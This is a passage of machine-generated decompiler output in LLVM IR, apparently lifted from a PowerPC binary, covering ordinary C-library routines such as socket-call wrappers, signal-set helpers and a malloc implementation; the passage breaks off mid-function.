  %v1_10010260 = add i32 %v2_1001025c, -8
  br label %dec_label_pc_10010264

dec_label_pc_10010264:                            ; preds = %dec_label_pc_100101c0.dec_label_pc_10010264_crit_edge, %dec_label_pc_10010234
  %v0_1001026c = phi i32 [ %v0_1001026c.pre, %dec_label_pc_100101c0.dec_label_pc_10010264_crit_edge ], [ %v1_10010258, %dec_label_pc_10010234 ]
  %v0_10010268 = phi i32 [ %v1_1001019c, %dec_label_pc_100101c0.dec_label_pc_10010264_crit_edge ], [ %v1_10010260, %dec_label_pc_10010234 ]
  %v3_10010264 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10010264, i32* @r4, align 4
  store i32 %v0_1001026c, i32* %r3.global-to-local, align 4
  store i32 268501620, i32* @lr, align 4
  %v3_10010270 = call i32 @strncpy(i32 %v0_1001026c, i32 %v3_10010264, i32 %v0_10010268)
  %v3_10010274 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10010274, i32* %r3.global-to-local, align 4
  store i32 268501628, i32* @lr, align 4
  %v1_10010278 = call i32 @free(i32 %v3_10010274)
  store i32 %v1_10010278, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10010280 = icmp eq i32 %tmp18, 1
  br i1 %v3_10010280, label %dec_label_pc_10010288, label %dec_label_pc_100102d0

dec_label_pc_10010288:                            ; preds = %dec_label_pc_10010264
  store i32 4, i32* @r5, align 4
  %v0_10010290 = load i32, i32* @r30, align 4
  store i32 %v0_10010290, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010298.632 to i32), i32* @lr, align 4
  %v0_10010294 = call i32 @memcpy()
  %v1_1001029c = load i32, i32* @r26, align 4
  %v2_1001029c = add i32 %v1_1001029c, 8
  %v3_1001029c = inttoptr i32 %v2_1001029c to i32*
  store i32 2, i32* %v3_1001029c, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_100102a4 = load i32, i32* @r26, align 4
  %v2_100102a4 = add i32 %v1_100102a4, 12
  %v3_100102a4 = inttoptr i32 %v2_100102a4 to i32*
  store i32 4, i32* %v3_100102a4, align 4
  %v0_100102a8 = load i32, i32* @r31, align 4
  %v1_100102a8 = load i32, i32* @r26, align 4
  %v2_100102a8 = inttoptr i32 %v1_100102a8 to i32*
  store i32 %v0_100102a8, i32* %v2_100102a8, align 4
  %v0_100102ac = load i32, i32* @r25, align 4
  %v1_100102ac = load i32, i32* @r26, align 4
  %v2_100102ac = add i32 %v1_100102ac, 16
  %v3_100102ac = inttoptr i32 %v2_100102ac to i32*
  store i32 %v0_100102ac, i32* %v3_100102ac, align 4
  %v0_100102b0 = load i32, i32* @r21, align 4
  %v1_100102b0 = load i32, i32* @r26, align 4
  %v2_100102b0 = add i32 %v1_100102b0, 4
  %v3_100102b0 = inttoptr i32 %v2_100102b0 to i32*
  store i32 %v0_100102b0, i32* %v3_100102b0, align 4
  %v3_100102b4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100102b4, i32* %r3.global-to-local, align 4
  store i32 268501692, i32* @lr, align 4
  %v1_100102b8 = call i32 @free(i32 %v3_100102b4)
  store i32 %v1_100102b8, i32* %r3.global-to-local, align 4
  %v0_100102bc = load i32, i32* @r26, align 4
  %v1_100102bc = load i32, i32* @r20, align 4
  %v2_100102bc = inttoptr i32 %v1_100102bc to i32*
  store i32 %v0_100102bc, i32* %v2_100102bc, align 4
  br label %dec_label_pc_100102c8

dec_label_pc_100102c8:                            ; preds = %dec_label_pc_100102d0, %dec_label_pc_10010114, %dec_label_pc_10010288
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10010288 ], [ 2, %dec_label_pc_10010114 ], [ 2, %dec_label_pc_100102d0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10010288 ], [ 1, %dec_label_pc_10010114 ], [ 1, %dec_label_pc_100102d0 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_100102c8 = load i32, i32* @r24, align 4
  %v2_100102c8 = inttoptr i32 %v1_100102c8 to i32*
  store i32 %storemerge, i32* %v2_100102c8, align 4
  br label %dec_label_pc_100102e8

dec_label_pc_100102d0:                            ; preds = %dec_label_pc_10010264
  %v3_100102d0 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100102d0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100102d8.633 to i32), i32* @lr, align 4
  %v1_100102d4 = call i32 @free(i32 %v3_100102d0)
  store i32 %v1_100102d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102c8

dec_label_pc_100102e4:                            ; preds = %dec_label_pc_100100a8, %dec_label_pc_1001008c, %dec_label_pc_10010080, %dec_label_pc_10010070, %dec_label_pc_10010060
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102e8

dec_label_pc_100102e8:                            ; preds = %dec_label_pc_10010044, %dec_label_pc_1001003c, %dec_label_pc_1000fff0, %entry, %dec_label_pc_100102c8, %dec_label_pc_100101a4, %dec_label_pc_100100e8, %dec_label_pc_100102e4
  store i32 %v0_1000ffbc, i32* %r0.global-to-local, align 4
  %v0_100102f8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100102f8

; uselistorder directives
  uselistorder i32 %v0_1001026c, { 1, 0 }
  uselistorder i32 %v1_1001023c, { 1, 0 }
  uselistorder i32 %v1_10010230, { 1, 0 }
  uselistorder i32 %v1_10010228, { 1, 0 }
  uselistorder i32 %v0_10010214, { 1, 0 }
  uselistorder i32 %v1_100102283, { 1, 0 }
  uselistorder i32 %v1_100101f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100101e8, { 1, 0, 2 }
  uselistorder i32 %v0_10010170, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_100100b4, { 1, 0, 2 }
  uselistorder i32 %v0_10010070.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10010058, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 25, 3, 4, 5, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100102e8, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100102c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010264, { 1, 0 }
  uselistorder label %dec_label_pc_10010210, { 1, 0 }
  uselistorder label %dec_label_pc_10010070, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10010310 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501792, i32* @lr, align 4
  %v2_1001031c = call i32 @__socketcall(i32 3, i32 %v2_10010310)
  ret i32 %v2_1001031c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10010344 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501844, i32* @lr, align 4
  %v2_10010350 = call i32 @__socketcall(i32 6, i32 %v2_10010344)
  ret i32 %v2_10010350

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10010378 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268501904, i32* @lr, align 4
  %v2_1001038c = call i32 @__socketcall(i32 15, i32 %v2_10010378)
  ret i32 %v2_1001038c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100103b4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501960, i32* @lr, align 4
  %v2_100103c4 = call i32 @__socketcall(i32 10, i32 %v2_100103b4)
  ret i32 %v2_100103c4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100103ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 268502016, i32* @lr, align 4
  %v2_100103fc = call i32 @__socketcall(i32 9, i32 %v2_100103ec)
  ret i32 %v2_100103fc

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10010424 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268502080, i32* @lr, align 4
  %v2_1001043c = call i32 @__socketcall(i32 11, i32 %v2_10010424)
  ret i32 %v2_1001043c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10010464 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268502140, i32* @lr, align 4
  %v2_10010478 = call i32 @__socketcall(i32 14, i32 %v2_10010464)
  ret i32 %v2_10010478

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100104a0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268502192, i32* @lr, align 4
  %v2_100104ac = call i32 @__socketcall(i32 1, i32 %v2_100104a0)
  ret i32 %v2_100104ac

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 6, 5, 0, 1, 4, 7, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_100104f0, label %dec_label_pc_100104dc

dec_label_pc_100104dc:                            ; preds = %entry
  %v0_100104dc = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100104e8 = inttoptr i32 %v0_100104dc to i32*
  store i32 22, i32* %v2_100104e8, align 4
  %v0_100104fc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100104f8

dec_label_pc_100104f0:                            ; preds = %entry
  %v0_100104f0 = call i32 @__sigaddset()
  store i32 %v0_100104f0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100104f8

dec_label_pc_100104f8:                            ; preds = %dec_label_pc_100104dc, %dec_label_pc_100104f0
  %v0_100104fc = phi i32 [ %v0_100104fc.pre, %dec_label_pc_100104dc ], [ %v0_100104f0, %dec_label_pc_100104f0 ]
  ret i32 %v0_100104fc

; uselistorder directives
  uselistorder label %dec_label_pc_100104f8, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268502308, i32* @lr, align 4
  %v3_10010520 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_10010538 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_10010538, label %dec_label_pc_10010564, label %dec_label_pc_10010554

dec_label_pc_10010554:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_10010564, label %dec_label_pc_1001055c

dec_label_pc_1001055c:                            ; preds = %dec_label_pc_10010554
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_10010594.lr.ph, label %dec_label_pc_10010564

dec_label_pc_10010564:                            ; preds = %dec_label_pc_1001055c, %dec_label_pc_10010554, %entry
  %v0_10010564 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10010570 = inttoptr i32 %v0_10010564 to i32*
  store i32 22, i32* %v2_10010570, align 4
  %v0_10010604.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010600

dec_label_pc_10010594.lr.ph:                      ; preds = %dec_label_pc_1001055c
  %v2_10010584 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10010584, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001059422 = add i32 %v2_10010584, 128
  %v3_1001059423 = inttoptr i32 %v2_1001059422 to i32*
  store i32 0, i32* %v3_1001059423, align 4
  %v0_1001059824 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001059825 = add i32 %v0_1001059824, -1
  store i32 %v1_1001059825, i32* %r11.global-to-local, align 4
  %v1_1001059c26 = mul i32 %v1_1001059825, 4
  %v1_100105a027 = load i32, i32* %r8.global-to-local, align 4
  %v2_100105a028 = add i32 %v1_100105a027, %v1_1001059c26
  store i32 %v2_100105a028, i32* %r9.global-to-local, align 4
  %v0_100105a429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100105a430 = add i32 %v0_100105a429, -1
  store i32 %v1_100105a430, i32* %ctr.global-to-local, align 4
  %v2_100105a431 = icmp eq i32 %v1_100105a430, 0
  br i1 %v2_100105a431, label %dec_label_pc_100105a8, label %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge

dec_label_pc_10010594.dec_label_pc_10010594_crit_edge: ; preds = %dec_label_pc_10010594.lr.ph, %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge
  %v2_100105a032 = phi i32 [ %v2_100105a0, %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge ], [ %v2_100105a028, %dec_label_pc_10010594.lr.ph ]
  %v0_10010594.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10010594 = add i32 %v2_100105a032, 4
  %v3_10010594 = inttoptr i32 %v2_10010594 to i32*
  store i32 %v0_10010594.pre, i32* %v3_10010594, align 4
  %v0_10010598 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010598 = add i32 %v0_10010598, -1
  store i32 %v1_10010598, i32* %r11.global-to-local, align 4
  %v1_1001059c = mul i32 %v1_10010598, 4
  %v1_100105a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100105a0 = add i32 %v1_100105a0, %v1_1001059c
  store i32 %v2_100105a0, i32* %r9.global-to-local, align 4
  %v0_100105a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100105a4 = add i32 %v0_100105a4, -1
  store i32 %v1_100105a4, i32* %ctr.global-to-local, align 4
  %v2_100105a4 = icmp eq i32 %v1_100105a4, 0
  br i1 %v2_100105a4, label %dec_label_pc_100105a8, label %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge

dec_label_pc_100105a8:                            ; preds = %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge, %dec_label_pc_10010594.lr.ph
  %v0_100105ac.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_100105a8 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_100105a8, i32* @r3, align 4
  store i32 %v0_100105ac.pre, i32* @r4, align 4
  %v0_100105b0 = call i32 @__sigaddset()
  %v1_100105b4 = icmp slt i32 %v0_100105b0, 0
  br i1 %v1_100105b4, label %dec_label_pc_100105fc, label %dec_label_pc_100105bc

dec_label_pc_100105bc:                            ; preds = %dec_label_pc_100105a8
  %v0_100105c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100105c8 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_10030e68.636 to i32), i32 %v0_100105c0)
  %v2_100105d4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268502508, i32* @lr, align 4
  %v4_100105e8 = call i32 @__libc_sigaction(i32 %v0_100105c0, i32* nonnull %stack_var_-296, i32 %v2_100105d4)
  %v1_100105ec = icmp slt i32 %v4_100105e8, 0
  br i1 %v1_100105ec, label %dec_label_pc_100105fc, label %dec_label_pc_100105f4

dec_label_pc_100105f4:                            ; preds = %dec_label_pc_100105bc
  %v3_100105f4 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_100105f4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010600

dec_label_pc_100105fc:                            ; preds = %dec_label_pc_100105bc, %dec_label_pc_100105a8
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010600

dec_label_pc_10010600:                            ; preds = %dec_label_pc_100105f4, %dec_label_pc_10010564, %dec_label_pc_100105fc
  %v0_10010604 = phi i32 [ %v3_100105f4, %dec_label_pc_100105f4 ], [ %v0_10010604.pre, %dec_label_pc_10010564 ], [ -1, %dec_label_pc_100105fc ]
  ret i32 %v0_10010604

; uselistorder directives
  uselistorder i32 %v1_100105a4, { 1, 0 }
  uselistorder i32 %v2_100105a0, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 65, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010600, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010594.dec_label_pc_10010594_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10010618 = add i32 %arg2, -1
  %v1_1001061c = call i32 @__asm_rlwinm(i32 %v1_10010618, i32 29, i32 3, i32 29)
  %v1_10010620 = urem i32 %v1_10010618, 32
  %v2_10010624 = add i32 %v1_1001061c, %arg1
  %v3_10010624 = inttoptr i32 %v2_10010624 to i32*
  %v4_10010624 = load i32, i32* %v3_10010624, align 4
  %v3_1001062c = shl i32 1, %v1_10010620
  %v2_10010630 = and i32 %v4_10010624, %v3_1001062c
  %v2_10010634 = icmp ne i32 %v2_10010630, 0
  %v5_10010638 = zext i1 %v2_10010634 to i32
  ret i32 %v5_10010638
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10010640 = load i32, i32* @r4, align 4
  %v1_10010640 = add i32 %v0_10010640, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10010648 = call i32 @__asm_rlwinm(i32 %v1_10010640, i32 29, i32 3, i32 29)
  %v1_1001064c = urem i32 %v1_10010640, 32
  %v1_10010650 = load i32, i32* @r3, align 4
  %v2_10010650 = add i32 %v1_10010650, %v1_10010648
  %v3_10010650 = inttoptr i32 %v2_10010650 to i32*
  %v4_10010650 = load i32, i32* %v3_10010650, align 4
  %v0_10010654 = load i32, i32* %r0.global-to-local, align 4
  %v3_10010654 = shl i32 %v0_10010654, %v1_1001064c
  store i32 %v3_10010654, i32* %r0.global-to-local, align 4
  %v2_10010658 = or i32 %v3_10010654, %v4_10010650
  store i32 %v2_10010658, i32* %v3_10010650, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10010668 = add i32 %arg2, -1
  %v1_10010670 = call i32 @__asm_rlwinm(i32 %v1_10010668, i32 29, i32 3, i32 29)
  %v1_10010674 = urem i32 %v1_10010668, 32
  %v2_10010678 = add i32 %v1_10010670, %arg1
  %v3_10010678 = inttoptr i32 %v2_10010678 to i32*
  %v4_10010678 = load i32, i32* %v3_10010678, align 4
  %v3_1001067c = shl i32 -2, %v1_10010674
  %v4_1001067c = sub nsw i32 32, %v1_10010674
  %v5_1001067c = lshr i32 -2, %v4_1001067c
  %v6_1001067c = or i32 %v5_1001067c, %v3_1001067c
  %v2_10010680 = and i32 %v6_1001067c, %v4_10010678
  store i32 %v2_10010680, i32* %v3_10010678, align 4
  ret i32 0
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10010690 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010690 = icmp eq i32 %v0_10010690, 0
  br i1 %v3_10010690, label %dec_label_pc_100106a8, label %dec_label_pc_100106ac

dec_label_pc_100106a8:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100106ac

dec_label_pc_100106ac:                            ; preds = %entry, %dec_label_pc_100106a8
  %v0_100106bc = phi i32 [ 1, %dec_label_pc_100106a8 ], [ %v0_10010690, %entry ]
  %v3_100106b0 = icmp ugt i32 %v0_100106bc, -8
  br i1 %v3_100106b0, label %dec_label_pc_100107c0, label %dec_label_pc_100106b8

dec_label_pc_100106b8:                            ; preds = %dec_label_pc_100106ac
  %v1_100106bc = add i32 %v0_100106bc, 4
  store i32 ptrtoint (i32* @global_var_10030e38.637 to i32), i32* @r29, align 4
  store i32 %v1_100106bc, i32* %stack_var_-40, align 4
  store i32 ptrtoint (i32* @global_var_10030e38.637 to i32), i32* %r3.global-to-local, align 4
  %v0_100106cc = call i32 @__pthread_return_0()
  %v2_100106d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21608), i32* %r3.global-to-local, align 4
  %v3_100106dc = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21608) to i32*), i32 %v2_100106d4)
  store i32 %v3_100106dc, i32* %r31.global-to-local, align 4
  %v0_100106e4 = load i32, i32* @r29, align 4
  store i32 %v0_100106e4, i32* %r3.global-to-local, align 4
  %v0_100106e8 = call i32 @__pthread_return_0()
  store i32 %v0_100106e8, i32* %r3.global-to-local, align 4
  %v3_100106ec = icmp eq i32 %v3_100106dc, 0
  br i1 %v3_100106ec, label %dec_label_pc_100106f4, label %dec_label_pc_100107a4.thread

dec_label_pc_100107a4.thread:                     ; preds = %dec_label_pc_100106b8
  br label %dec_label_pc_100107b8

dec_label_pc_100106f4:                            ; preds = %dec_label_pc_100106b8
  %v3_100106f8 = load i32, i32* @global_var_1002abf8.640, align 4
  store i32 %v3_100106f8, i32* %r31.global-to-local, align 4
  %v3_100106fc = load i32, i32* %stack_var_-40, align 4
  %v2_10010700 = icmp ult i32 %v3_100106fc, %v3_100106f8
  br i1 %v2_10010700, label %dec_label_pc_10010718, label %dec_label_pc_10010708

dec_label_pc_10010708:                            ; preds = %dec_label_pc_100106f4
  %v1_1001070c = sub i32 0, %v3_100106f8
  %v2_10010708 = add i32 %v3_100106f8, -1
  %v1_10010710 = add i32 %v2_10010708, %v3_100106fc
  %v2_10010714 = and i32 %v1_10010710, %v1_1001070c
  store i32 %v2_10010714, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010718

dec_label_pc_10010718:                            ; preds = %dec_label_pc_100106f4, %dec_label_pc_10010708
  store i32 ptrtoint (i32* @global_var_10030ee8.641 to i32), i32* %r3.global-to-local, align 4
  %v0_10010724 = call i32 @__pthread_return_0()
  %v0_10010728 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10010728, i32* %r3.global-to-local, align 4
  store i32 268502832, i32* @lr, align 4
  %v1_1001072c = call i32 @__GI_sbrk(i32 %v0_10010728)
  store i32 %v1_1001072c, i32* %r3.global-to-local, align 4
  %v3_10010730 = icmp eq i32 %v1_1001072c, -1
  br i1 %v3_10010730, label %dec_label_pc_10010750, label %dec_label_pc_10010738

dec_label_pc_10010738:                            ; preds = %dec_label_pc_10010718
  %v1_10010738 = add i32 %v1_1001072c, 3
  %v1_1001073c = call i32 @__asm_rlwinm(i32 %v1_10010738, i32 0, i32 0, i32 29)
  store i32 %v1_1001073c, i32* @r30, align 4
  %v4_10010740 = icmp eq i32 %v1_1001073c, %v1_1001072c
  br i1 %v4_10010740, label %dec_label_pc_10010750, label %dec_label_pc_10010748

dec_label_pc_10010748:                            ; preds = %dec_label_pc_10010738
  %v2_10010748 = sub i32 %v1_1001073c, %v1_1001072c
  store i32 %v2_10010748, i32* %r3.global-to-local, align 4
  store i32 268502864, i32* @lr, align 4
  %v1_1001074c = call i32 @__GI_sbrk(i32 %v2_10010748)
  store i32 %v1_1001074c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010750

dec_label_pc_10010750:                            ; preds = %dec_label_pc_10010738, %dec_label_pc_10010718, %dec_label_pc_10010748
  store i32 ptrtoint (i32* @global_var_10030ee8.641 to i32), i32* %r3.global-to-local, align 4
  %v0_10010758 = call i32 @__pthread_return_0()
  store i32 %v0_10010758, i32* %r3.global-to-local, align 4
  %v0_1001075c = load i32, i32* @r30, align 4
  %v3_1001075c = icmp eq i32 %v0_1001075c, -1
  br i1 %v3_1001075c, label %dec_label_pc_100107c0, label %dec_label_pc_100107a4

dec_label_pc_100107a4:                            ; preds = %dec_label_pc_10010750
  store i32 ptrtoint (i32* @global_var_10030e38.637 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002ab98 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10030e38.637 to i32), i32* %r3.global-to-local, align 4
  %v0_10010778 = call i32 @__pthread_return_0()
  %v0_1001077c = load i32, i32* @r31, align 4
  %v0_10010780 = load i32, i32* @r30, align 4
  %v0_10010784 = load i32, i32* @r29, align 4
  store i32 %v0_10010784, i32* %r3.global-to-local, align 4
  store i32 268502924, i32* @lr, align 4
  %v3_10010788 = inttoptr i32 %v0_10010784 to i32*
  %v4_10010788 = call i32 @__heap_free(i32* %v3_10010788, i32 %v0_10010780, i32 %v0_1001077c)
  %v0_1001078c = load i32, i32* @r29, align 4
  store i32 %v0_1001078c, i32* %r3.global-to-local, align 4
  %v2_10010794 = inttoptr i32 %v0_1001078c to i32*
  %v3_10010794 = call i32 @__heap_alloc(i32* %v2_10010794, i32 %v2_100106d4)
  store i32 %v3_10010794, i32* %r31.global-to-local, align 4
  %v0_1001079c = load i32, i32* @r28, align 4
  store i32 %v0_1001079c, i32* %r3.global-to-local, align 4
  %v0_100107a0 = call i32 @__pthread_return_0()
  store i32 %v0_100107a0, i32* %r3.global-to-local, align 4
  %v3_100107a4 = icmp eq i32 %v3_10010794, 0
  br i1 %v3_100107a4, label %dec_label_pc_100107b8.thread, label %dec_label_pc_100107b8

dec_label_pc_100107b8.thread:                     ; preds = %dec_label_pc_100107a4
  br label %dec_label_pc_100107c0

dec_label_pc_100107b8:                            ; preds = %dec_label_pc_100107a4, %dec_label_pc_100107a4.thread
  %v0_100107b8.pr6 = phi i32 [ %v3_100106dc, %dec_label_pc_100107a4.thread ], [ %v3_10010794, %dec_label_pc_100107a4 ]
  %v3_100107ac = load i32, i32* %stack_var_-40, align 4
  %v2_100107b0 = inttoptr i32 %v0_100107b8.pr6 to i32*
  store i32 %v3_100107ac, i32* %v2_100107b0, align 4
  %v0_100107b4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100107b4 = add i32 %v0_100107b4, 4
  store i32 %v1_100107b4, i32* @r31, align 4
  %v3_100107b8 = icmp eq i32 %v1_100107b4, 0
  br i1 %v3_100107b8, label %dec_label_pc_100107c0, label %dec_label_pc_100107d0

dec_label_pc_100107c0:                            ; preds = %dec_label_pc_100107b8.thread, %dec_label_pc_100107b8, %dec_label_pc_10010750, %dec_label_pc_100106ac
  %v0_100107c0 = call i32 @__errno_location()
  store i32 %v0_100107c0, i32* %r3.global-to-local, align 4
  %v2_100107c8 = inttoptr i32 %v0_100107c0 to i32*
  store i32 12, i32* %v2_100107c8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100107d0

dec_label_pc_100107d0:                            ; preds = %dec_label_pc_100107b8, %dec_label_pc_100107c0
